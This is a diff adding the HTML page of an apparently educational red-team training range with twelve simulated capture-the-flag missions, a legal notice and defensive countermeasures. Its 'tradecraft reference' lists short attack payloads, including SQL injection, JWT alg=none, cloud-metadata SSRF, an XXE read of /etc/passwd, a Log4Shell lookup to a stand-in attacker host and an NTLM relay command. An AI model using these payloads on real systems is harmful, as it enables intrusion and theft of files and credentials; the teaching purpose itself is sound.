@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=5.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data:; connect-src 'self';">
+<title>RED_OPS_RANGE // Web · Cloud · AD Offense — FURIOS-INT</title>
+    <link rel="icon" type="image/svg+xml" href="assets/favicon.svg">
+    <meta property="og:title" content="RED_OPS_RANGE">
+    <meta property="og:description" content="Recon to exfil red-team kill chain.">
+    <meta property="og:image" content="assets/og-image.svg">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="theme-color" content="#020408">
+<link href="https://fonts.googleapis.com/css2?family=VT323&family=Pixelify+Sans&family=JetBrains+Mono:wght@300;400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/os.css">
+<link rel="stylesheet" href="css/wargames.css">
+<style>
+:root{--rx-red:#ff3a4f;--rx-pink:#ff00ea;}
+.rx-shell{max-width:1280px;margin:0 auto;padding:24px 16px 80px;}
+
+.rx-hero{position:relative;border:1px solid var(--rx-red);
+  background:linear-gradient(135deg,#08020a 0%,#1a0008 60%,#1a0014 100%);padding:30px 28px;overflow:hidden;}
+.rx-hero::after{content:'';position:absolute;inset:0;pointer-events:none;
+  background:repeating-linear-gradient(0deg,transparent 0,transparent 3px,rgba(255,58,79,0.05) 3px,rgba(255,58,79,0.05) 4px);}
+.rx-hero h1{font-family:'Pixelify Sans';font-size:clamp(30px,5vw,56px);color:#fff;
+  text-shadow:0 0 18px var(--rx-red),0 0 50px rgba(255,58,79,0.2);}
+.rx-hero h1 b{color:var(--rx-red);}
+.rx-hero p{color:var(--wg-text-mute);font-size:14px;line-height:1.7;max-width:780px;margin-top:12px;}
+.rx-hero .rx-tags{margin-top:14px;display:flex;flex-wrap:wrap;gap:8px;}
+.rx-hero .rx-tags span{font-family:'VT323';font-size:13px;padding:2px 9px;border:1px solid var(--wg-line);color:var(--rx-red);}
+
+.rx-warn{margin-top:14px;padding:10px 14px;border:1px dashed var(--rx-red);background:rgba(255,58,79,0.05);
+  font-family:'VT323';font-size:14px;color:#ffb3b9;line-height:1.6;}
+.rx-warn b{color:var(--rx-red);}
+
+.rx-hud{margin-top:16px;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;}
+.rx-hud .h-cell{background:var(--wg-panel);border:1px solid var(--wg-line);padding:10px 14px;}
+.rx-hud .h-cell .h-lbl{font-family:'VT323';font-size:13px;color:var(--wg-text-mute);letter-spacing:1px;}
+.rx-hud .h-cell .h-val{font-family:'Pixelify Sans';font-size:20px;color:var(--rx-red);}
+.rx-hud .h-cell.b .h-val{color:var(--wg-cyan);}
+.rx-hud .h-cell.g .h-val{color:var(--wg-green);}
+
+.rx-h2{margin:28px 0 12px;font-family:'Pixelify Sans';font-size:22px;color:var(--rx-red);
+  letter-spacing:2px;border-bottom:1px solid var(--wg-line);padding-bottom:8px;}
+.rx-h2 small{font-family:'VT323';font-size:14px;color:var(--wg-text-mute);float:right;letter-spacing:1px;margin-top:6px;}
+
+.rx-tier-legend{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:10px;}
+.rx-tier-legend span{font-family:'VT323';font-size:13px;padding:2px 10px;border:1px solid;letter-spacing:1px;}
+.rx-tier-legend .r{color:#5cf08a;border-color:#5cf08a;}
+.rx-tier-legend .o{color:#ffd166;border-color:#ffd166;}
+.rx-tier-legend .e{color:#ff7e6b;border-color:#ff7e6b;}
+.rx-tier-legend .c{color:#ff5cf0;border-color:#ff5cf0;}
+
+#rx-mount{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;}
+
+.rx-tracks{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px;margin-top:8px;}
+.rx-track{background:var(--wg-panel);border:1px solid var(--wg-line);padding:14px;border-left:3px solid var(--rx-red);}
+.rx-track h4{font-family:'Pixelify Sans';font-size:15px;color:#fff;margin-bottom:4px;}
+.rx-track p{font-size:12px;color:var(--wg-text-mute);line-height:1.55;}
+.rx-track.cyn{border-left-color:var(--wg-cyan);}
+.rx-track.grn{border-left-color:var(--wg-green);}
+.rx-track.pnk{border-left-color:var(--wg-pink);}
+.rx-track.amb{border-left-color:#ffb000;}
+
+.rx-killchain{display:grid;grid-template-columns:repeat(7,1fr);gap:0;margin-top:8px;}
+.rx-killchain .kc{background:#02060a;border:1px solid var(--wg-line);padding:10px 8px;text-align:center;}
+.rx-killchain .kc b{font-family:'Pixelify Sans';font-size:12px;color:#fff;display:block;margin-bottom:3px;}
+.rx-killchain .kc small{font-family:'VT323';font-size:11px;color:var(--wg-text-mute);display:block;line-height:1.3;}
+.rx-killchain .kc.active{border-color:var(--rx-red);background:rgba(255,58,79,0.06);}
+.rx-killchain .kc.active b{color:var(--rx-red);}
+
+.rx-wow{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:10px;}
+.rx-wow .item{background:#02060a;border:1px solid var(--wg-line);padding:12px 14px;}
+.rx-wow .item h5{font-family:'Pixelify Sans';font-size:14px;color:#fff;margin-bottom:4px;}
+.rx-wow .item code{font-family:'JetBrains Mono';font-size:11px;color:var(--wg-cyan);background:#000;padding:1px 4px;display:inline-block;}
+.rx-wow .item p{font-size:12px;color:var(--wg-text-mute);line-height:1.55;margin-top:4px;}
+
+@media(max-width:760px){.rx-killchain{grid-template-columns:repeat(2,1fr);}}
+</style>
+</head>
+<body>
+<div id="crt-filter"></div>
+<canvas id="wg-bg"></canvas>
+
+<nav class="top-nav">
+  <a href="index.html">&#8962; HOME</a>
+  <a href="games.html">🎮 GAMES_HUB</a>
+  <a href="cyberworld.html">🌐 CYBERWORLD</a>
+  <a href="wargames.html">⌖ WAR_GAMES</a>
+  <a href="forensics.html">🔬 FORENSICS</a>
+  <a href="redops.html">☣ RED_OPS</a>
+  <a href="ctf-trail.html">☠ CTF_TRAIL</a>
+  <a href="profile.html">⌧ PROFILE</a>
+</nav>
+
+<main class="rx-shell">
+
+  <section class="rx-hero">
+    <div class="rx-tags"><span>// RED_OPS_RANGE</span><span>// SHA-256 VERIFIER</span><span>// 12 TARGETS</span><span>// CLEARANCE: SIMULATED</span></div>
+    <h1>RED <b>OPS</b> RANGE</h1>
+    <p>Twelve simulated offensive scenarios mirroring the canonical OWASP-Top-10 + Active Directory tradecraft. Web recon, IDOR, JWT confusion, SSRF, XXE, SQLi, SSTI, command injection, prototype pollution, Log4Shell, pickle deserialization, Kerberoasting. Same secure verifier as WAR_GAMES — only flag hashes ship in source. Progress is local-only.</p>
+    <div class="rx-warn">
+      <b>RANGE NOTICE.</b> All scenarios are <b>simulated targets</b> on the FLLC educational range. Do not run any of these techniques against systems you do not own or are not explicitly authorized to test. Unauthorized access violates US 18 USC §1030 (CFAA) and equivalents worldwide. The lab teaches detection &amp; defense as much as attack mechanics.
+    </div>
+    <div class="rx-hud">
+      <div class="h-cell"><div class="h-lbl">RANK</div><div class="h-val" id="rx-rank">◇ RECRUIT</div></div>
+      <div class="h-cell b"><div class="h-lbl">XP</div><div class="h-val" id="rx-xp">0</div></div>
+      <div class="h-cell g"><div class="h-lbl">SOLVED</div><div class="h-val" id="rx-solved">0 / 12</div></div>
+      <div class="h-cell"><div class="h-lbl">TRACK COVER</div><div class="h-val" id="rx-cover">0 / 6</div></div>
+    </div>
+  </section>
+
+  <section><div id="ss-strip"></div></section>
+
+  <h2 class="rx-h2">▶ TRACKS<small>six attack surfaces</small></h2>
+  <div class="rx-tracks">
+    <div class="rx-track cyn"><h4>WEB_RECON</h4><p>robots.txt, sitemap.xml, .git exposure, JS map files, DNS history, archive scraping. Quiet enumeration.</p></div>
+    <div class="rx-track grn"><h4>AUTH_BYPASS</h4><p>IDOR, broken access control, JWT alg confusion, session fixation, OAuth redirect_uri abuse.</p></div>
+    <div class="rx-track amb"><h4>SSRF / XXE</h4><p>Cloud metadata pivots (IMDSv1), file:// XML entities, blind SSRF detection, DNS exfil.</p></div>
+    <div class="rx-track"><h4>INJECTION</h4><p>SQLi (boolean, time, union), NoSQLi, LDAP, command injection, header injection, CRLF.</p></div>
+    <div class="rx-track pnk"><h4>RCE / DESERIALIZE</h4><p>Java deserialization, Python pickle, Ruby Marshal, Log4Shell JNDI, .NET BinaryFormatter.</p></div>
+    <div class="rx-track grn"><h4>AD_OFFENSE</h4><p>Kerberoast, AS-REP roast, NTLM relay, BloodHound paths, DC sync, golden/silver tickets.</p></div>
+  </div>
+
+  <h2 class="rx-h2">▶ CYBER KILL CHAIN<small>Lockheed Martin model</small></h2>
+  <div class="rx-killchain">
+    <div class="kc active"><b>RECON</b><small>r01</small></div>
+    <div class="kc active"><b>WEAPONIZE</b><small>r03</small></div>
+    <div class="kc active"><b>DELIVER</b><small>r05 r10</small></div>
+    <div class="kc active"><b>EXPLOIT</b><small>r06 r07 r08</small></div>
+    <div class="kc active"><b>INSTALL</b><small>r09 r11</small></div>
+    <div class="kc active"><b>C2</b><small>r04</small></div>
+    <div class="kc active"><b>ACTIONS</b><small>r12</small></div>
+  </div>
+
+  <h2 class="rx-h2">▶ MISSION QUEUE<small>tier ramps automatically</small></h2>
+  <div class="rx-tier-legend">
+    <span class="r">ROOKIE 75-150 XP</span>
+    <span class="o">OPERATIVE 225-275 XP</span>
+    <span class="e">ELITE 400-475 XP</span>
+    <span class="c">CLASSIFIED 600-850 XP</span>
+  </div>
+  <div id="rx-mount"></div>
+
+  <h2 class="rx-h2">▶ TRADECRAFT REFERENCE<small>quick recall</small></h2>
+  <div class="rx-wow">
+    <div class="item"><h5>SQLi tautology</h5><code>' OR 1=1 --</code><p>Classic boolean true. Still works against unparameterized queries.</p></div>
+    <div class="item"><h5>JWT alg=none</h5><code>{"alg":"none","typ":"JWT"}</code><p>If accepted, drop the signature, forge any claim.</p></div>
+    <div class="item"><h5>Cloud SSRF (AWS)</h5><code>http://169.254.169.254/latest/meta-data/</code><p>IMDSv1 link-local. IMDSv2 requires session token.</p></div>
+    <div class="item"><h5>XXE entity</h5><code>&lt;!ENTITY x SYSTEM "file:///etc/passwd"&gt;</code><p>Reference &amp;x; in document body to leak files.</p></div>
+    <div class="item"><h5>Jinja2 SSTI probe</h5><code>{{7*7}}</code><p>Returns 49 → confirms Python/Jinja2. Pivot to {{config}}.</p></div>
+    <div class="item"><h5>Cmd injection separator</h5><code>; &amp;&amp; || ` $()</code><p>Any of these chains a second command in shell context.</p></div>
+    <div class="item"><h5>Prototype pollution</h5><code>{"__proto__":{"isAdmin":true}}</code><p>Recursive merges that don't gate __proto__ leak the chain.</p></div>
+    <div class="item"><h5>Log4Shell lookup</h5><code>${jndi:ldap://attacker/x}</code><p>log4j2 &lt; 2.15. Any logged input is the sink.</p></div>
+    <div class="item"><h5>Pickle gadget</h5><code>__reduce__ → (callable, args)</code><p>pickle.loads() on attacker data = RCE by spec.</p></div>
+    <div class="item"><h5>Kerberoast hash type</h5><code>hashcat -m 13100</code><p>TGS-REP RC4. Target service accounts with weak pw.</p></div>
+    <div class="item"><h5>HTTP smuggling</h5><code>CL.TE / TE.CL / TE.TE</code><p>Front + back disagree on which header sets boundary.</p></div>
+    <div class="item"><h5>NTLM relay</h5><code>impacket-ntlmrelayx -t ldap://dc</code><p>Turn coercion (Printer/RPC) into LDAP-signed mod.</p></div>
+  </div>
+
+  <h2 class="rx-h2">▶ DEFENSIVE PAIRINGS<small>you must teach the blue too</small></h2>
+  <div class="rx-tracks">
+    <div class="rx-track cyn"><h4>SQLi → Parameterized queries</h4><p>Use prepared statements + ORM with bind variables. Never concatenate. WAF as defense-in-depth, not primary.</p></div>
+    <div class="rx-track grn"><h4>JWT → Pin alg + verify aud/iss</h4><p>Allow-list a single algorithm in code. Reject "none". Verify audience &amp; issuer claims.</p></div>
+    <div class="rx-track amb"><h4>SSRF → IMDSv2 + egress allow-list</h4><p>Force IMDSv2 (session-token); deny outbound from app subnet by default; resolver allow-list.</p></div>
+    <div class="rx-track"><h4>XXE → disable DTD/external entities</h4><p>libxml: LIBXML_NONET + disable DOCTYPE. Java: setFeature("disallow-doctype-decl",true).</p></div>
+    <div class="rx-track pnk"><h4>Deserialization → typed schemas</h4><p>Never deserialize untrusted bytes with native pickle/Java/.NET binary. Use signed JSON / protobuf with allow-listed types.</p></div>
+    <div class="rx-track grn"><h4>Kerberoast → strong service pw + LDAP gMSA</h4><p>30-char service passwords, gMSA where possible, monitor 4769 logon events with RC4 ticket flag.</p></div>
+  </div>
+
+  <h2 class="rx-h2">▶ ROADMAP<small>v1 → v2</small></h2>
+  <div class="rx-tracks">
+    <div class="rx-track"><h4>v1.0 (LIVE)</h4><p>12 missions across 6 tracks. Secure SHA-256 verifier. Hint &amp; walkthrough system.</p></div>
+    <div class="rx-track cyn"><h4>v1.1</h4><p>+5 web missions: HTTP smuggling (CL.TE), CSRF token bypass, CORS misconfig, GraphQL introspection, PHP type juggling.</p></div>
+    <div class="rx-track grn"><h4>v1.2</h4><p>+4 cloud missions: S3 bucket public read, GCP service account impersonation, Azure storage SAS leak, K8s SA token leak.</p></div>
+    <div class="rx-track pnk"><h4>v2.0</h4><p>BloodHound mini-graph + simulated AD path. Drag-drop attack paths. Each edge is a mini mission.</p></div>
+  </div>
+
+</main>
+
+<div id="wg-mission-dialog" class="wg-modal" role="dialog" aria-modal="true" aria-labelledby="rx-md-title">
+  <div class="wg-modal-card">
+    <header class="wg-modal-head">
+      <span class="wg-mdiff" data-f="tier"></span>
+      <h2 data-f="title" id="rx-md-title"></h2>
+      <button class="wg-x" type="button" aria-label="close" onclick="document.getElementById('wg-mission-dialog').classList.remove('open')">×</button>
+    </header>
+    <div class="wg-modal-meta">
+      <span data-f="skill"></span>
+      <span data-f="points"></span>
+    </div>
+    <div class="wg-modal-body">
+      <h4>BRIEF</h4>          <p data-f="brief"></p>
+      <h4>SCENARIO</h4>       <p data-f="scenario"></p>
+      <h4>LAB ARTIFACTS</h4>  <div data-f="lab"></div>
+      <h4>HINTS</h4>          <div data-f="hints" class="wg-hints"></div>
+      <h4>FLAG SUBMISSION</h4>
+      <div class="wg-flag-row">
+        <input data-f="input" type="text" placeholder="enter recovered flag…" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
+        <button data-f="submit" type="button" class="wg-btn wg-btn-primary">VERIFY ▶</button>
+      </div>
+      <div data-f="status" class="wg-status"></div>
+      <h4>POST-MORTEM</h4>     <div data-f="walkthrough"></div>
+    </div>
+  </div>
+</div>
+
+<div id="taskbar">
+  <a href="index.html">&#8962; FURIOS-INT</a>
+  <a href="games.html">GAMES_HUB</a>
+  <a href="wargames.html">WAR_GAMES</a>
+  <a href="forensics.html">FORENSICS</a>
+  <a href="redops.html">RED_OPS</a>
+  <a href="cyberworld.html">CYBERWORLD</a>
+  <span style="margin-left:auto;color:#444;font-family:'VT323';font-size:16px;" id="rx-clock"></span>
+</div>
+
+<script src="js/wargames-engine.js"></script>
+<script src="js/site-stats.js"></script>
+<script src="js/mission-extras.js"></script>
+<script>document.addEventListener('DOMContentLoaded',function(){if(window.SiteStats)SiteStats.renderStrip('ss-strip');});</script>
+<script src="js/redops-missions.js"></script>
+<script>
+setInterval(function(){
+  var c=document.getElementById('rx-clock'); if(!c) return;
+  c.textContent=new Date().toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'});
+},1000);
+
+WG.init({
+  missions: window.RX_MISSIONS,
+  mountId: 'rx-mount',
+  storageKey: 'fllc.redops.v1',
+  onComplete: function(m){ /* hook */ }
+});
+
+function paintHud(){
+  var p = WG.getProgress();
+  var rank = document.getElementById('rx-rank');
+  var xp   = document.getElementById('rx-xp');
+  var sv   = document.getElementById('rx-solved');
+  var cv   = document.getElementById('rx-cover');
+  if(rank) rank.textContent = p.rank;
+  if(xp)   xp.textContent   = p.xp;
+  if(sv)   sv.textContent   = p.solved.length + ' / ' + window.RX_MISSIONS.length;
+  if(cv){
+    var skills = {};
+    p.solved.forEach(function(id){
+      var m = window.RX_MISSIONS.find(function(x){return x.id===id;});
+      if(m) skills[m.skill] = true;
+    });
+    cv.textContent = Object.keys(skills).length + ' / 6';
+  }
+}
+paintHud(); setInterval(paintHud, 1500);
+
+// grid bg
+(function(){
+  var c=document.getElementById('wg-bg'); if(!c) return;
+  var ctx=c.getContext('2d');
+  function R(){c.width=innerWidth;c.height=innerHeight;} R(); addEventListener('resize',R);
+  var t=0;
+  (function tick(){
+    t+=0.003;
+    ctx.fillStyle='rgba(4,2,4,0.3)'; ctx.fillRect(0,0,c.width,c.height);
+    ctx.strokeStyle='rgba(255,58,79,0.04)';
+    var step=46; var off=(t*30)%step;
+    ctx.beginPath();
+    for(var x=-step+off;x<c.width;x+=step){ctx.moveTo(x,0);ctx.lineTo(x,c.height);}
+    for(var y=-step+off;y<c.height;y+=step){ctx.moveTo(0,y);ctx.lineTo(c.width,y);}
+    ctx.stroke();
+    requestAnimationFrame(tick);
+  })();
+})();
+</script>
+</body>
+</html>
